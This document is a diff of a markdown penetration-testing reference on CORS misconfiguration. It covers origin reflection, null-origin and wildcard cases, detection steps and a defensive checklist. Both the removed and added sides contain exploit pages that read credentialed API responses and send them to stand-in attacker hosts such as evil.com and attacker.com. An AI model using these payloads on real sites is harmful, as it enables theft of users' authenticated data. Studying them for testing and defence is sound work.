@@ -1,78 +1,62 @@
-# CORS Misconfiguration: Complete Reference
+# CORS Misconfiguration: 2026 Reference
 
-## Detection
+## Vulnerable Configurations
 
 ### Origin Reflection
-```bash
-# If the server reflects back any origin
-curl -H "Origin: https://evil.com" https://target.com/api/sensitive
-# Response:
-# Access-Control-Allow-Origin: https://evil.com
-# Access-Control-Allow-Credentials: true
-```
-
-### Null Origin
-```bash
-# Some servers trust null origin
-curl -H "Origin: null" https://target.com/api/user
-curl -H "Origin: file://" https://target.com/api/user
-
-# Sandboxed iframe can send null origin requests
-<iframe sandbox="allow-scripts" src="https://target.com/api/user"></iframe>
-```
-
-### Wildcard with Credentials
-```bash
-# If Access-Control-Allow-Credentials is set with wildcard origin
-Access-Control-Allow-Origin: *
+```http
+Access-Control-Allow-Origin: https://attacker.com
 Access-Control-Allow-Credentials: true
-# This SHOULD fail per spec, but some implementations allow it
 ```
+Server reads `Origin` header and echoes it back — ANY origin allowed with credentials.
 
-### Preflight Bypass
-```bash
-# Some endpoints skip preflight for simple requests (GET, POST with URL-encoded)
-# They still include CORS headers in response
-curl -X GET -H "Origin: https://evil.com" https://target.com/api/user
+### Wildcard Origin (No Credentials)
+```http
+Access-Control-Allow-Origin: *
 ```
+Cannot send cookies, but useful for:
+- Internal network scanning via CORS (XS-Leaks)
+- Cache poisoning if combined with Vary: Origin
+
+### Null Origin Bypass
+```http
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+Triggered by:
+- `sandboxed` iframe
+- `data:` URL
+- `file://` protocol
 
 ## Exploitation
 
-### Dynamic Origin Reflection
+### Preflight CORS Attack
 ```html
-<html>
-<body>
+<!DOCTYPE html>
 <script>
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://target.com/api/user', true);
-xhr.withCredentials = true;
-xhr.onload = function() {
-  fetch('https://evil.com/steal?data=' + encodeURIComponent(btoa(xhr.responseText)));
-};
-xhr.send();
-</script>
-</body>
-</html>
-```
-
-### Subdomain Takeover Based
-```html
-<!-- If target trusts subdomains -->
-<!-- Takeover a subdomain first, then exploit CORS from there -->
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://target.com/api/admin', true);
-xhr.withCredentials = true;
-xhr.onload = function() {
-  fetch('https://taken-subdomain.com/steal?data=' + btoa(xhr.responseText));
-};
-xhr.send();
+fetch('https://target.com/api/sensitive', {
+  credentials: 'include'
+}).then(r => r.text()).then(d => location='https://attacker.com/?d='+btoa(d))
 </script>
 ```
+Host this on attacker server, send link to victim. Works when Origin is echoed and credentials allowed.
 
-## CVSS Scoring
-| Scenario | CVSS | Criteria |
-|----------|------|---------|
-| CORS reflection -> data theft | 6.1 | Network, Low, User interaction required |
-| CORS null origin -> sandboxed iframe steal | 8.1 | Network, Low, User interaction required |
-| CORS wildcard with credentials | 7.5 | Network, Low, No auth |
+### XS-Leak via CORS
+- Check if API endpoint exists by observing error vs success
+- Determine object ownership by response content
+- Enumerate valid user IDs without auth
+
+## Detection
+1. Check ALL `Access-Control-Allow-*` headers
+2. Send request with arbitrary `Origin:` header
+3. Check preflight (`OPTIONS`) response
+4. Look for `null` origin in allowlist
+5. Test both credentialed and non-credentialed requests
+6. Check subdomains for more permissive CORS policies
+
+## Defensive Checklist
+1. Never echo Origin header — use static allowlist
+2. Never use `Access-Control-Allow-Origin: *` with credentials
+3. Never include `Access-Control-Allow-Origin: null`
+4. Use `Vary: Origin` to prevent cache poisoning
+5. Restrict `Access-Control-Allow-Methods` to required methods
+6. Use short `Access-Control-Max-Age` for preflight
